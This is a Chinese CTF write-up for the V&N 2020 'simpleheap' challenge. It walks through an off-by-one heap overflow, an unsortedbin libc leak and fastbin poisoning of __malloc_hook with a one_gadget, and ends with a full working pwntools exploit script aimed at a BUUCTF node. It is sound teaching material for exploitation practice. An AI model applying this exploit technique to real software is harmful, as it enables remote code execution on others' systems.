
## OFF BY ONE

所谓OFF BY ONE就是利用堆溢出一个字节到下一个堆块，使得目前堆块与下一堆块合并成一个堆块，此时堆块的大小就是我们溢出的那一字节

并且堆块的fd(前驱指针)以及bk(后继指针)都会指向

main_arena+88的地址这也是我们泄露出来的地址

利用gdb 输入libc查看基地址，main_arena+88-libc=offset

## UNSORTERBIN&FASTBINS

在堆块的bins中分为fastbins，largebins，smallbins还有今天要用到的unsortedbin。所谓unsortedbin就是为未分类的区块。

## 例题讲解

本次我选用V&N在2020的招新赛的simpleheap 如有需要可在buuctf找到

## 思路概述

我们先创建足够的堆块一般对于这种菜单类型的题目我们创建4个堆块

其中编号为3(编号从0到3)的堆块用来隔开top chunk避免我们需要用到的编号为1,2的堆块中的2堆块与top chunk重合导致无法使用unsortedbin攻击

接着去利用off by one+unsortedbin泄露libc(使用show函数)最后将堆排布好并构建payload传入即可

## First step

常规操作checksec

保护全开64位，倒也正常。接着拉进ida慢慢分析

```text
q@ubuntu:~$ checksec vn
[*] '/home/q/vn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

如下我们可以发现是个非常经典的菜单题目，那么经过查找漏洞点发现在edit函数

```text
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_A39(a1, a2, a3);
  puts("Welcome to V&N challange!");
  puts("This's a simple heap for you.");
  while ( 1 )
  {
    menu();
    switch ( (unsigned int)sub_9EA() )
    {
      case 1u:
        add();
        break;
      case 2u:
        edit();
        break;
      case 3u:
        show();
        break;
      case 4u:
        del();
        break;
      case 5u:
        exit(0);
      default:
        puts("Please input current choice.");
        break;
    }
  }
}
```

如下get_input_content里面有个off by one 的漏洞

```text
unsigned __int64 __fastcall sub_C39(__int64 a1, int a2)
{
  unsigned __int64 result; // rax
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( (int)i > a2 )
      break;
    if ( !read(0, (void *)((int)i + a1), 1uLL) )
      exit(0);
    if ( *(_BYTE *)((int)i + a1) == 10 )
    {
      result = (int)i + a1;
      *(_BYTE *)result = 0;
      return result;
    }
  }
  return result;
}
```

## Second step

在第一步我们对程序的漏洞点寻找完毕

现在我们要开始第二步去利用off by one创建fake chunk了，先上交互函数

```text
from pwn import *
context(log_level='debug')
r=process('./vn')
#elf=ELF('./vn')
#r=remote('node3.buuoj.cn',28465)
libc=ELF('16.so')
def add(size,content):
        r.recvuntil("choice: ")
        r.sendline("1")
        r.sendlineafter("size?",str(size))
        r.sendlineafter("content:",content)
def edit(idx,content):
        r.recvuntil("choice: ")
        r.sendline("2")
        r.sendlineafter("idx?",str(idx))
        r.sendlineafter("content:",content)
def dump(idx):
        r.recvuntil("choice: ")
        r.sendline("3")
        r.sendlineafter("idx?",str(idx))
def free(idx):
        r.recvuntil("choice: ")
        r.sendline("4")
        r.sendlineafter("idx?",str(idx))
```

如思路概述所讲到我们需要创建4个堆

我们创建好的堆结构如下

  

![](https://pic2.zhimg.com/80/v2-1d8825371dc3a86104fe8aae5fd2aea1_720w.webp)

  

在gdb中正常的堆结构如下

```text
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x556b208da000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x556b208da020
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x556b208da090
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x556b208da100
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x556b208da120
Size: 0x20ee1
```

接下来我们开始利用off by one去对其创建fake chunk

```text
add(0x18,b'a')#0
add(0x68,b'a')#1
add(0x68,b'a')#2
add(0x18,b'a')#3 阻断top chunk

edit(0,b'a'*0x18+b'\xe1')
#e1=70+70+1
free(1)
gdb.attach(r)
```

gdb中调试结果如下，我们很明显的可以看见**两个0x71的堆块合并**成了我们想要的0xe1的堆块，此时我们的fake chunk就构建完毕了

```text
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5650f994f000
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5650f994f020
Size: 0xe1
fd: 0x7fc2f9aebb78
bk: 0x7fc2f9aebb78

Allocated chunk
Addr: 0x5650f994f100
Size: 0x20

Top chunk | PREV_INUSE
Addr: 0x5650f994f120
Size: 0x20ee1
```

## Third step

有了fake chunk 现在我们就需要用到unsortedbin里面的chunk去泄露libc

在开头的 OFF BY ONE 的介绍中我们提到了因为 OFF BY ONE 形成的 chunk，**其 fd bk 指针会指向 main_arena+88**，在 gdb 输入 libc 可以得到 libc 的地址

main_arena+88-libc=offset=0x3c4b78

在这里呢我们现在要解决的如何用脚本实现交互自动取得偏移呢？

这里就要继续提到

## 分割unsortedbin

我们重新申请一个堆块，该堆块的大小若刚好在unsortedbin中(强烈建议对半分割)，我们申请回来之后通过gdb可以看见其中的堆结构如下

一个0x71在unsortedbin，另外一个是我们可以正常使用的，此时他的内容便是fd与bk指向的地址main_arena+88

```text
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x559615971000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x559615971020
Size: 0x71

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x559615971090
Size: 0x71
fd: 0x7f0437e11b78
bk: 0x7f0437e11b78

Allocated chunk
Addr: 0x559615971100
Size: 0x20

Top chunk | PREV_INUSE
Addr: 0x559615971120
Size: 0x20ee1
```

因此我们可以得的泄露脚本如下

```text
add(0x68,b'a'*0x08)#1 切割unsortedbin 使得2进入unsortedbin泄露

main_arena

dump(2)

leak=u64(r.recv(6).ljust(8,b'\x00'))

print(hex(leak))

gdb.attach(r)

libc_base=leak-(0x3c4b78)#0x7f2c05c6cb78-0x7f2c058a8000

realloc_addr=libc_base+libc.sym['__libc_realloc']

malloc_hook=libc_base+libc.sym['__malloc_hook']

fake_chunk_addr=malloc_hook-0x23

one_gadget=libc_base+0x4526a

print(hex(realloc_addr))

print(hex(fake_chunk_addr))
```

## PS:

这里可以说下为什么fake_chunk_addr=malloc_hook-0x23

这个malloc_hook-0x23刚好可以达到fastbin这个基本上每个程序都是固定的

如下0x7f78812fbaed就是fake chunk的地址处于fastbins

并且非常有意思的是此处正是我们leak处main_arena+88这个地方减去88再减去0x33得的的地址，并且该地址也是我们对堆块输入内容的地址

```text
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x55f8ce9d4090 —▸ 0x7f78812fbaed (_IO_wide_data_0+301) ◂— 0x7880fbcea0000000
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

## Last step

我们现在有了需要的一切，那么现在最后一步就是对堆进行排布并且传入我们构建好的payload

在这里所谓的堆排布就是我们要想办法让堆块去执行我们的传入的payload

从第三步完结的时候堆排布如下

此时我们再申请一个0x68大小的堆块就可以把unsortedbin里面的东西都拿出来

此时堆结构依然不改变，只是位于unsortedbin的chunk变成可以利用的正常chunk其fd bk指针不再指向别的地址而是去指向前驱和后继的chunk

```text
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555d4046b000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555d4046b020
Size: 0x71

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555d4046b090
Size: 0x71
fd: 0x7ff34264eb78
bk: 0x7ff34264eb78

Allocated chunk
Addr: 0x555d4046b100
Size: 0x20

Top chunk | PREV_INUSE
Addr: 0x555d4046b120
Size: 0x20ee1
```

接下来我们再去free掉一个0x68大小的chunk

对留下来的0x68大小的chunk内容填充为fake chunk的地址

接着继续把被free的chunk申请回来，那么此时fastbin链表就会去指向fake chunk

也许语言看蒙了人，我就用图表示

图1如下是free掉后再去填充的样子

  

![](https://pic4.zhimg.com/80/v2-80008d718ffbcf87bab69f8194705ec7_720w.webp)

  

图2如下是我们把被free的chunk申请回来后的样子

  

![](https://pic3.zhimg.com/80/v2-92aa4282c16bd145baaa25571cd805b2_720w.webp)

  

此时我们可以说是已经劫持成功了，我们接着去填充payload然后再申请一个堆块就可以触发payload了

```text
add(0x68,b'a'*0x08)# 4与2同时指向0x70

free(4)
edit(2,p64(fake_chunk_addr))

add(0x68,b'a'*0x08)#4


payload=b'a'*(0x13-0x08)+p64(one_gadget)+p64(realloc_addr+12)
add(0x68,payload)#5

r.recvuntil("choice: ")
r.sendline("1")
r.sendlineafter("size?",str(0x18))
print(hex(libc.sym['__malloc_hook']))
r.interactive()
```

## PS:

关于为什么是0x13-0x08，因为我们从main_arena-0x33的位置填充的(第三步有提到)，而这个位置距离realloc_hook的距离就是(0x13-8)

关于realloc_hook压栈到底要加多少

我们可以打开gdb输入 x/32i __libc_realloc

```text
pwndbg> x/32i __libc_realloc
   0x7ff34230e710 <__GI___libc_realloc>: push   r15
   0x7ff34230e712 <__GI___libc_realloc+2>: push   r14
   0x7ff34230e714 <__GI___libc_realloc+4>: push   r13
   0x7ff34230e716 <__GI___libc_realloc+6>: push   r12
   0x7ff34230e718 <__GI___libc_realloc+8>: mov    r12,rsi
   0x7ff34230e71b <__GI___libc_realloc+11>: push   rbp
   0x7ff34230e71c <__GI___libc_realloc+12>: push   rbx
```

把里面的数字一个个代入试试看。

最后的完整exp如下

## EXP:

需要的libc从buuctf里面下载

```text
from pwn import *
context(log_level='debug')
#r=process('./vn')
#elf=ELF('./vn')
r=remote('node3.buuoj.cn',28640)
libc=ELF('64.so')
def add(size,content):
        r.recvuntil("choice: ")
        r.sendline("1")
        r.sendlineafter("size?",str(size))
        r.sendlineafter("content:",content)
def edit(idx,content):
        r.recvuntil("choice: ")
        r.sendline("2")
        r.sendlineafter("idx?",str(idx))
        r.sendlineafter("content:",content)
def dump(idx):
        r.recvuntil("choice: ")
        r.sendline("3")
        r.sendlineafter("idx?",str(idx))
def free(idx):
        r.recvuntil("choice: ")
        r.sendline("4")
        r.sendlineafter("idx?",str(idx))


#gdb.attach(r)
add(0x18,b'a')#0
add(0x68,b'a')#1
add(0x68,b'a')#2
add(0x18,b'a')#3 阻断top chunk

edit(0,b'a'*0x18+b'\xe1')
free(1)
add(0x68,b'a'*0x08)#1 切割unsortedbin 使得2进入unsortedbin泄露main_arena
dump(2)
leak=u64(r.recv(6).ljust(8,b'\x00'))
print(hex(leak))

libc_base=leak-(0x3c4b78)#0x7f2c05c6cb78-0x7f2c058a8000
realloc_addr=libc_base+libc.sym['__libc_realloc']
malloc_hook=libc_base+libc.sym['__malloc_hook']
fake_chunk_addr=malloc_hook-0x23
one_gadget=libc_base+0x4526a
print(hex(realloc_addr))
print(hex(fake_chunk_addr))
add(0x68,b'a'*0x08)# 4与2同时指向0x70
free(4)
edit(2,p64(fake_chunk_addr))
add(0x68,b'a'*0x08)#4
payload=b'a'*(0x13-0x08)+p64(one_gadget)+p64(realloc_addr+12)
add(0x68,payload)#5
r.recvuntil("choice: ")
r.sendline("1")
r.sendlineafter("size?",str(0x18))
print(hex(libc.sym['__malloc_hook']))
r.interactive()
```

结果如下

![](https://pic2.zhimg.com/80/v2-9e2e0378a9310d9c5d0cb83bdf55e82d_720w.webp)

```text
缓冲区溢出基础与实践
```